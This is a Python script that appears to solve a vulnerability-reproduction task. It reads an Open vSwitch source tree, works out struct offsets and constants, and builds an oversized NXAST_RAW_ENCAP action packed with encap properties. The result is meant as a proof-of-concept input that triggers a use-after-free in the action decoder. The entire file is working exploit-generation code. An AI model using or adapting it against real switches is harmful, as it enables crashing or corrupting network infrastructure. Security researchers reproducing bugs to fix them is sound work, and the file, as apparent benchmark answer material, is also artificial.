import os
import re
import tarfile
import tempfile
import shutil
import struct
import ast
from typing import Dict, Optional, Tuple, List, Any


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*", "", s)
    return s


def _clean_c_expr(expr: str) -> str:
    expr = expr.strip()
    expr = expr.split("\n", 1)[0].strip()
    expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.S).strip()
    expr = re.sub(r"//.*", "", expr).strip()

    expr = re.sub(r"\b(UINT|INT)(8|16|32|64)_C\s*\(\s*([^)]+)\s*\)", r"(\3)", expr)
    expr = re.sub(r"\bUINTPTR_C\s*\(\s*([^)]+)\s*\)", r"(\1)", expr)
    expr = re.sub(r"\bUINTMAX_C\s*\(\s*([^)]+)\s*\)", r"(\1)", expr)

    expr = re.sub(r"\(\s*(const\s+)?(unsigned\s+)?(signed\s+)?(long\s+long|long|short|int|char|size_t|uint\d+_t|int\d+_t|uintptr_t|uintmax_t|uint64_t|uint32_t|uint16_t|uint8_t|ovs_be\d+|ovs_16aligned_be\d+)\s*\)", "", expr)

    expr = re.sub(r"(?<=\b0x[0-9A-Fa-f]+)(ULL|LL|UL|LU|U|L)\b", "", expr)
    expr = re.sub(r"(?<=\b\d+)(ULL|LL|UL|LU|U|L)\b", "", expr)

    expr = expr.replace("/", "//")
    return expr.strip()


class _ExprEval(ast.NodeVisitor):
    def __init__(self, names: Dict[str, int]):
        self.names = names

    def visit_Expression(self, node: ast.Expression) -> int:
        return self.visit(node.body)

    def visit_Constant(self, node: ast.Constant) -> int:
        if isinstance(node.value, bool):
            return int(node.value)
        if isinstance(node.value, int):
            return int(node.value)
        raise ValueError("unsupported constant")

    def visit_Num(self, node: ast.Num) -> int:  # pragma: no cover
        return int(node.n)

    def visit_Name(self, node: ast.Name) -> int:
        if node.id in self.names:
            return int(self.names[node.id])
        raise KeyError(node.id)

    def visit_UnaryOp(self, node: ast.UnaryOp) -> int:
        v = self.visit(node.operand)
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
        raise ValueError("unsupported unary op")

    def visit_BinOp(self, node: ast.BinOp) -> int:
        a = self.visit(node.left)
        b = self.visit(node.right)
        if isinstance(node.op, ast.Add):
            return a + b
        if isinstance(node.op, ast.Sub):
            return a - b
        if isinstance(node.op, ast.Mult):
            return a * b
        if isinstance(node.op, (ast.Div, ast.FloorDiv)):
            if b == 0:
                raise ZeroDivisionError
            return a // b
        if isinstance(node.op, ast.Mod):
            if b == 0:
                raise ZeroDivisionError
            return a % b
        if isinstance(node.op, ast.LShift):
            return a << b
        if isinstance(node.op, ast.RShift):
            return a >> b
        if isinstance(node.op, ast.BitOr):
            return a | b
        if isinstance(node.op, ast.BitAnd):
            return a & b
        if isinstance(node.op, ast.BitXor):
            return a ^ b
        raise ValueError("unsupported bin op")

    def generic_visit(self, node: ast.AST) -> int:
        raise ValueError(f"unsupported AST node: {type(node).__name__}")


def _try_eval_int(expr: str, names: Dict[str, int]) -> Optional[int]:
    expr = _clean_c_expr(expr)
    if not expr:
        return None
    try:
        node = ast.parse(expr, mode="eval")
        return int(_ExprEval(names).visit(node))
    except Exception:
        return None


def _safe_extract_tar(tar_path: str, out_dir: str) -> None:
    with tarfile.open(tar_path, "r:*") as tf:
        members = tf.getmembers()
        out_real = os.path.realpath(out_dir)
        safe_members = []
        for m in members:
            name = m.name
            if name.startswith("/") or name.startswith("\\"):
                continue
            dest = os.path.realpath(os.path.join(out_dir, name))
            if not (dest == out_real or dest.startswith(out_real + os.sep)):
                continue
            safe_members.append(m)
        tf.extractall(out_dir, members=safe_members)


def _pick_project_root(extract_dir: str) -> str:
    entries = [e for e in os.listdir(extract_dir) if not e.startswith(".")]
    if len(entries) == 1:
        p = os.path.join(extract_dir, entries[0])
        if os.path.isdir(p):
            return p
    return extract_dir


def _iter_source_files(root: str) -> List[str]:
    res = []
    skip_dirs = {".git", "build", "Build", "out", "dist", "autom4te.cache", "__pycache__"}
    for dp, dns, fns in os.walk(root):
        dns[:] = [d for d in dns if d not in skip_dirs and not d.startswith(".")]
        for fn in fns:
            if not (fn.endswith(".c") or fn.endswith(".h")):
                continue
            p = os.path.join(dp, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size > 6_000_000:
                continue
            res.append(p)
    return res


def _file_contains(p: str, needle: str) -> bool:
    try:
        with open(p, "rb") as f:
            data = f.read()
        return needle.encode("utf-8") in data
    except Exception:
        return False


def _find_files_containing(root: str, needle: str, limit: int = 50) -> List[str]:
    out = []
    for p in _iter_source_files(root):
        if _file_contains(p, needle):
            out.append(p)
            if len(out) >= limit:
                break
    return out


def _parse_defines_and_enums_from_text(text: str, define_exprs: Dict[str, str], consts: Dict[str, int]) -> None:
    text_nc = _strip_c_comments(text)

    for m in re.finditer(r"^[ \t]*#[ \t]*define[ \t]+([A-Za-z_]\w*)[ \t]+(.+)$", text_nc, flags=re.M):
        name = m.group(1)
        rhs = m.group(2).strip()
        rhs = rhs.split("\\", 1)[0].strip()
        rhs = rhs.strip()
        if "(" in name:
            continue
        if name not in define_exprs and name not in consts:
            define_exprs[name] = rhs

    for em in re.finditer(r"\benum\b[^;{]*\{", text_nc):
        start = em.end() - 1
        i = start
        depth = 0
        while i < len(text_nc):
            c = text_nc[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i
                    break
            i += 1
        else:
            continue

        body = text_nc[start + 1:end]
        parts = [p.strip() for p in body.split(",") if p.strip()]
        cur_val = None
        for part in parts:
            part = part.strip()
            if not part:
                continue
            if "=" in part:
                n, ex = part.split("=", 1)
                n = n.strip()
                ex = ex.strip()
                v = _try_eval_int(ex, consts)
                if v is None:
                    v = _try_eval_int(ex, {**consts, **{}})
                if v is not None:
                    consts[n] = int(v)
                    cur_val = int(v)
                else:
                    define_exprs.setdefault(n, ex)
                    cur_val = None
            else:
                n = part.split()[0].strip()
                if cur_val is None:
                    cur_val = 0 if n not in consts else consts[n]
                else:
                    cur_val += 1
                if n not in consts:
                    consts[n] = int(cur_val)


def _resolve_define_exprs(define_exprs: Dict[str, str], consts: Dict[str, int], max_rounds: int = 40) -> None:
    for _ in range(max_rounds):
        progress = False
        for k, expr in list(define_exprs.items()):
            if k in consts:
                define_exprs.pop(k, None)
                progress = True
                continue
            v = _try_eval_int(expr, consts)
            if v is not None:
                consts[k] = int(v)
                define_exprs.pop(k, None)
                progress = True
        if not progress:
            break


def _find_function_body_in_text(text: str, func_name: str) -> Optional[str]:
    idx = text.find(func_name)
    if idx < 0:
        return None
    brace = text.find("{", idx)
    if brace < 0:
        return None
    i = brace
    depth = 0
    while i < len(text):
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[brace:i + 1]
        i += 1
    return None


def _find_struct_body(root: str, struct_name: str) -> Optional[str]:
    candidates = _find_files_containing(root, f"struct {struct_name}")
    pat = re.compile(r"\bstruct\s+" + re.escape(struct_name) + r"\b")
    for p in candidates:
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                t = f.read()
        except Exception:
            continue
        m = pat.search(t)
        if not m:
            continue
        brace = t.find("{", m.end())
        if brace < 0:
            continue
        i = brace
        depth = 0
        while i < len(t):
            c = t[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i
                    tail = t[end:end + 5]
                    if "};" in tail:
                        return t[brace + 1:end]
                    j = t.find(";", end, end + 50)
                    if j != -1:
                        return t[brace + 1:end]
                    break
            i += 1
    return None


def _normalize_ctype(ctype: str) -> str:
    ctype = ctype.strip()
    ctype = re.sub(r"\bconst\b", "", ctype)
    ctype = re.sub(r"\bvolatile\b", "", ctype)
    ctype = re.sub(r"\bregister\b", "", ctype)
    ctype = re.sub(r"\s+", " ", ctype).strip()
    return ctype


def _sizeof_ctype(ctype: str, struct_sizes: Dict[str, int]) -> Optional[int]:
    ctype = _normalize_ctype(ctype)
    if "*" in ctype:
        return None
    builtin = {
        "uint8_t": 1,
        "int8_t": 1,
        "char": 1,
        "signed char": 1,
        "unsigned char": 1,
        "uint16_t": 2,
        "int16_t": 2,
        "short": 2,
        "unsigned short": 2,
        "uint32_t": 4,
        "int32_t": 4,
        "int": 4,
        "unsigned int": 4,
        "uint64_t": 8,
        "int64_t": 8,
        "long long": 8,
        "unsigned long long": 8,
        "ovs_be16": 2,
        "ovs_be32": 4,
        "ovs_be64": 8,
        "ovs_16aligned_be32": 4,
        "ovs_16aligned_be64": 8,
        "ofp_port_t": 4,
    }
    if ctype in builtin:
        return builtin[ctype]
    if ctype.startswith("struct "):
        sn = ctype.split(None, 1)[1].strip()
        if sn in struct_sizes:
            return struct_sizes[sn]
        return None
    if ctype in struct_sizes:
        return struct_sizes[ctype]
    return None


def _parse_struct_fields(body: str, consts: Dict[str, int], struct_sizes: Dict[str, int]) -> List[Tuple[str, str, int, int]]:
    body_nc = _strip_c_comments(body)
    body_nc = re.sub(r"^\s*#.*$", "", body_nc, flags=re.M)
    stmts = [s.strip() for s in body_nc.split(";") if s.strip()]
    fields = []
    off = 0
    for st in stmts:
        st = st.strip()
        if not st:
            continue
        if st.startswith("union ") or st.startswith("enum ") or st.startswith("struct ") and "{" in st:
            continue
        st = re.sub(r"\bOVS_PACKED\b", "", st)
        st = re.sub(r"\bOVS_ALIGNED\(\s*\d+\s*\)\b", "", st)
        st = st.strip()

        m = re.match(r"^(?P<type>.+?)\s+(?P<name>[A-Za-z_]\w*)\s*(?P<arr>\[[^\]]*\])?$", st)
        if not m:
            continue
        ctype = m.group("type").strip()
        name = m.group("name").strip()
        arr = m.group("arr")
        size = _sizeof_ctype(ctype, struct_sizes)
        if size is None:
            continue
        count = 1
        if arr is not None:
            a = arr.strip()[1:-1].strip()
            if a == "" or a == "0":
                break
            v = _try_eval_int(a, consts)
            if v is None:
                v = 1
            count = int(v)
        fsize = size * count
        fields.append((name, _normalize_ctype(ctype), fsize, off))
        off += fsize
    return fields


def _compute_struct_size(root: str, struct_name: str, consts: Dict[str, int], cache: Dict[str, Any]) -> Optional[int]:
    if struct_name in cache:
        v = cache[struct_name]
        if isinstance(v, int):
            return v
        if isinstance(v, dict) and "size" in v:
            return int(v["size"])
    body = _find_struct_body(root, struct_name)
    if body is None:
        return None
    cache.setdefault(struct_name, {"size": None, "fields": None})
    struct_sizes = {k: (v if isinstance(v, int) else v.get("size")) for k, v in cache.items() if isinstance(v, (int, dict))}
    struct_sizes = {k: int(v) for k, v in struct_sizes.items() if isinstance(v, int)}
    changed = True
    for _ in range(20):
        if not changed:
            break
        changed = False
        fields = _parse_struct_fields(body, consts, struct_sizes)
        ok = True
        for _, ty, _, _ in fields:
            if ty.startswith("struct "):
                sn = ty.split(None, 1)[1].strip()
                if sn not in struct_sizes:
                    s = _compute_struct_size(root, sn, consts, cache)
                    if s is not None:
                        struct_sizes[sn] = int(s)
                        changed = True
                    else:
                        ok = False
        if ok:
            size = 0
            for _, _, fs, off in fields:
                size = max(size, off + fs)
            cache[struct_name] = {"size": int(size), "fields": fields}
            return int(size)
    return None


def _get_struct_layout(root: str, struct_name: str, consts: Dict[str, int], cache: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    s = _compute_struct_size(root, struct_name, consts, cache)
    if s is None:
        return None
    v = cache.get(struct_name)
    if isinstance(v, dict):
        return v
    return None


def _find_field_offset_recursive(root: str, struct_name: str, consts: Dict[str, int], cache: Dict[str, Any], target_names: Tuple[str, ...], base_off: int = 0, depth: int = 0) -> Optional[int]:
    if depth > 6:
        return None
    layout = _get_struct_layout(root, struct_name, consts, cache)
    if not layout:
        return None
    for name, ty, fs, off in layout["fields"]:
        if name in target_names:
            return base_off + off
        if ty.startswith("struct "):
            sn = ty.split(None, 1)[1].strip()
            r = _find_field_offset_recursive(root, sn, consts, cache, target_names, base_off + off, depth + 1)
            if r is not None:
                return r
    return None


def _extract_action_struct_name_from_decode(root: str) -> Optional[Tuple[str, str]]:
    candidates = _find_files_containing(root, "decode_NXAST_RAW_ENCAP")
    for p in candidates:
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                t = f.read()
        except Exception:
            continue
        fb = _find_function_body_in_text(t, "decode_NXAST_RAW_ENCAP")
        if not fb:
            continue
        m = re.search(r"\bconst\s+struct\s+([A-Za-z_]\w*raw_encap[A-Za-z_]\w*)\s*\*", fb)
        if m:
            return p, m.group(1)
        m = re.search(r"\bconst\s+struct\s+([A-Za-z_]\w*)\s*\*[^;]*\braw_encap\b", fb)
        if m:
            return p, m.group(1)
        return p, "nx_action_raw_encap"
    candidates = _find_files_containing(root, "RAW_ENCAP")
    for p in candidates:
        if "ofp-actions" in os.path.basename(p):
            return p, "nx_action_raw_encap"
    return None


def _extract_decode_ed_prop_info(root: str, consts: Dict[str, int]) -> Tuple[Optional[str], Optional[str], int, int]:
    files = _find_files_containing(root, "decode_ed_prop")
    for p in files:
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                t = f.read()
        except Exception:
            continue
        fb = _find_function_body_in_text(t, "decode_ed_prop")
        if not fb:
            continue

        header_struct = None
        var = None
        m = re.search(r"(\w+)\s*->\s*type\b", fb)
        if m:
            var = m.group(1)
            m2 = re.search(r"\bstruct\s+([A-Za-z_]\w*)\s*\*\s*" + re.escape(var) + r"\b", fb)
            if m2:
                header_struct = m2.group(1)
        if not header_struct:
            m = re.search(r"\bstruct\s+([A-Za-z_]\w*ed_prop[A-Za-z_]\w*)\s*\*\s*(\w+)\b", fb)
            if m:
                header_struct = m.group(1)
                var = m.group(2)

        if header_struct:
            return p, header_struct, 0, 0
        return p, None, 0, 0
    return None, None, 0, 0


def _choose_ed_prop_type_and_len(root: str, consts: Dict[str, int]) -> Tuple[int, int]:
    ed_files = _find_files_containing(root, "decode_ed_prop")
    if not ed_files:
        for k in sorted(consts.keys()):
            if k.startswith("NX_ED_PROP_") and all(x not in k for x in ("END", "PAD", "UNSPEC", "NONE")):
                v = consts.get(k)
                if isinstance(v, int) and v != 0:
                    return int(v) & 0xFFFF, 8
        return 1, 8

    best = None
    for p in ed_files[:10]:
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                t = f.read()
        except Exception:
            continue
        fb = _find_function_body_in_text(t, "decode_ed_prop")
        if not fb:
            continue

        cases = list(re.finditer(r"\bcase\s+([A-Za-z_]\w*)\s*:", fb))
        for i, cm in enumerate(cases):
            cname = cm.group(1)
            if cname not in consts:
                continue
            if any(x in cname for x in ("END", "PAD", "NONE", "UNSPEC", "UNSPECIFIED")):
                continue
            cval = consts.get(cname)
            if not isinstance(cval, int):
                continue
            if cval == 0:
                continue
            start = cm.end()
            end = cases[i + 1].start() if i + 1 < len(cases) else len(fb)
            blk = fb[start:end]

            req = None
            mins = []
            for m in re.finditer(r"\blen\s*!=\s*(\d+)\b", blk):
                v = int(m.group(1))
                if v > 0:
                    mins.append(v)
            if mins:
                req = min(mins)
            else:
                mins = []
                for m in re.finditer(r"\blen\s*<\s*(\d+)\b", blk):
                    v = int(m.group(1))
                    if v > 0:
                        mins.append(v)
                if mins:
                    req = max(mins)
            if req is None:
                req = 8
            if req < 4:
                req = 4
            if req % 8 != 0:
                req = ((req + 7) // 8) * 8
            if req > 256:
                continue

            err_count = len(re.findall(r"\bOFPERR_", blk))
            return_count = len(re.findall(r"\breturn\b", blk))
            score = (err_count, return_count, req)
            cand = (score, int(cval) & 0xFFFF, int(req))
            if best is None or cand[0] < best[0]:
                best = cand

    if best:
        return best[1], best[2]

    for k in sorted(consts.keys()):
        if k.startswith("NX_ED_PROP_") and all(x not in k for x in ("END", "PAD", "UNSPEC", "NONE")):
            v = consts.get(k)
            if isinstance(v, int) and v != 0:
                return int(v) & 0xFFFF, 8
    return 1, 8


def _find_stub_size(root: str) -> int:
    candidates = _find_files_containing(root, "LLVMFuzzerTestOneInput", limit=20)
    stub_sizes = []
    for p in candidates:
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                t = f.read()
        except Exception:
            continue
        for m in re.finditer(r"\bOFPBUF_STUB_INITIALIZER\s*\(\s*[^,]+,\s*(\d+)\s*\)", t):
            stub_sizes.append(int(m.group(1)))
        for m in re.finditer(r"\bofpbuf_init\s*\(\s*&\w+\s*,\s*(\d+)\s*\)", t):
            stub_sizes.append(int(m.group(1)))
    if stub_sizes:
        return max(64, min(stub_sizes))
    return 64


def _pack_ed_prop(prop_type: int, prop_len: int, header_size: int, type_off: int, len_off: int) -> bytes:
    b = bytearray(prop_len)
    if header_size <= prop_len and type_off + 2 <= prop_len and len_off + 2 <= prop_len:
        struct.pack_into("!H", b, type_off, prop_type & 0xFFFF)
        struct.pack_into("!H", b, len_off, prop_len & 0xFFFF)
    else:
        struct.pack_into("!H", b, 0, prop_type & 0xFFFF)
        struct.pack_into("!H", b, 2, prop_len & 0xFFFF)
    return bytes(b)


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp = tempfile.mkdtemp(prefix="poc_uaf_")
        try:
            _safe_extract_tar(src_path, tmp)
            root = _pick_project_root(tmp)

            consts: Dict[str, int] = {}
            define_exprs: Dict[str, str] = {}

            seed_files = set()
            for needle in ("NXAST_RAW_ENCAP", "RAW_ENCAP", "decode_ed_prop", "decode_NXAST_RAW_ENCAP", "NX_EXPERIMENTER_ID", "NX_VENDOR_ID", "NX_VENDOR"):
                for p in _find_files_containing(root, needle, limit=30):
                    seed_files.add(p)

            if not seed_files:
                seed_files = set(_iter_source_files(root)[:200])

            for p in seed_files:
                try:
                    with open(p, "r", encoding="utf-8", errors="ignore") as f:
                        t = f.read()
                except Exception:
                    continue
                _parse_defines_and_enums_from_text(t, define_exprs, consts)

            _resolve_define_exprs(define_exprs, consts)

            if "NXAST_RAW_ENCAP" not in consts:
                patt = re.compile(r"(?:#\s*define\s+NXAST_RAW_ENCAP\s+|NXAST_RAW_ENCAP\s*=\s*)([^,\n}]+)")
                for p in _find_files_containing(root, "NXAST_RAW_ENCAP", limit=50):
                    try:
                        with open(p, "r", encoding="utf-8", errors="ignore") as f:
                            t = f.read()
                    except Exception:
                        continue
                    m = patt.search(_strip_c_comments(t))
                    if m:
                        v = _try_eval_int(m.group(1), consts)
                        if v is not None:
                            consts["NXAST_RAW_ENCAP"] = int(v)
                            break

            vendor = consts.get("NX_EXPERIMENTER_ID")
            if not isinstance(vendor, int):
                vendor = consts.get("NX_VENDOR_ID")
            if not isinstance(vendor, int):
                vendor = consts.get("NX_VENDOR")
            if not isinstance(vendor, int):
                vendor = 0x00002320

            subtype = consts.get("NXAST_RAW_ENCAP")
            if not isinstance(subtype, int):
                subtype = 0
            subtype &= 0xFFFF

            prop_type, prop_len = _choose_ed_prop_type_and_len(root, consts)

            stub_size = _find_stub_size(root)
            target_total = max(256, min(16384, stub_size * 8))

            cache: Dict[str, Any] = {}

            decode_info = _extract_action_struct_name_from_decode(root)
            struct_name = "nx_action_raw_encap"
            decode_file = None
            if decode_info:
                decode_file, struct_name = decode_info

            base_size = _compute_struct_size(root, struct_name, consts, cache)
            if base_size is None:
                base_size = 24

            vendor_off = _find_field_offset_recursive(root, struct_name, consts, cache, ("vendor", "experimenter", "nx_vendor", "exp_id"))
            subtype_off = _find_field_offset_recursive(root, struct_name, consts, cache, ("subtype", "subtype_"))
            encap_len_off = _find_field_offset_recursive(root, struct_name, consts, cache, ("encap_len", "raw_encap_len", "header_len", "hdr_len"))
            props_len_off = _find_field_offset_recursive(root, struct_name, consts, cache, ("props_len", "properties_len", "prop_len", "tlv_len"))

            type_off = 0
            len_off = 2

            ed_header_size = 4
            ed_type_off = 0
            ed_len_off = 2

            ed_file, ed_struct, _, _ = _extract_decode_ed_prop_info(root, consts)
            if ed_struct:
                ed_size = _compute_struct_size(root, ed_struct, consts, cache)
                if isinstance(ed_size, int) and 2 <= ed_size <= 16:
                    ed_header_size = int(ed_size)
                    ed_type_off2 = _find_field_offset_recursive(root, ed_struct, consts, cache, ("type",))
                    ed_len_off2 = _find_field_offset_recursive(root, ed_struct, consts, cache, ("len", "length"))
                    if ed_type_off2 is not None:
                        ed_type_off = int(ed_type_off2)
                    if ed_len_off2 is not None:
                        ed_len_off = int(ed_len_off2)

            if prop_len < ed_header_size:
                prop_len = ((ed_header_size + 7) // 8) * 8

            if base_size % 8 != 0:
                base_size += (8 - (base_size % 8))

            if prop_len % 8 != 0:
                prop_len += (8 - (prop_len % 8))

            if target_total < base_size + prop_len:
                target_total = base_size + prop_len

            nprops = (target_total - base_size + prop_len - 1) // prop_len
            if nprops < 1:
                nprops = 1
            total_len = base_size + nprops * prop_len
            if total_len % 8 != 0:
                total_len += (8 - (total_len % 8))

            header = bytearray(base_size)
            struct.pack_into("!H", header, type_off, 0xFFFF)
            struct.pack_into("!H", header, len_off, total_len & 0xFFFF)
            if vendor_off is not None and vendor_off + 4 <= len(header):
                struct.pack_into("!I", header, int(vendor_off), vendor & 0xFFFFFFFF)
            else:
                if 4 + 4 <= len(header):
                    struct.pack_into("!I", header, 4, vendor & 0xFFFFFFFF)
            if subtype_off is not None and subtype_off + 2 <= len(header):
                struct.pack_into("!H", header, int(subtype_off), subtype & 0xFFFF)
            else:
                if 8 + 2 <= len(header):
                    struct.pack_into("!H", header, 8, subtype & 0xFFFF)

            if encap_len_off is not None and encap_len_off + 2 <= len(header):
                struct.pack_into("!H", header, int(encap_len_off), 0)

            props_bytes_len = total_len - base_size
            if props_len_off is not None:
                off = int(props_len_off)
                if off + 2 <= len(header):
                    struct.pack_into("!H", header, off, props_bytes_len & 0xFFFF)
                elif off + 4 <= len(header):
                    struct.pack_into("!I", header, off, props_bytes_len & 0xFFFFFFFF)

            props = bytearray()
            one = _pack_ed_prop(prop_type, prop_len, ed_header_size, ed_type_off, ed_len_off)
            props.extend(one * nprops)
            if len(props) < props_bytes_len:
                props.extend(b"\x00" * (props_bytes_len - len(props)))
            elif len(props) > props_bytes_len:
                props = props[:props_bytes_len]

            return bytes(header + props)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)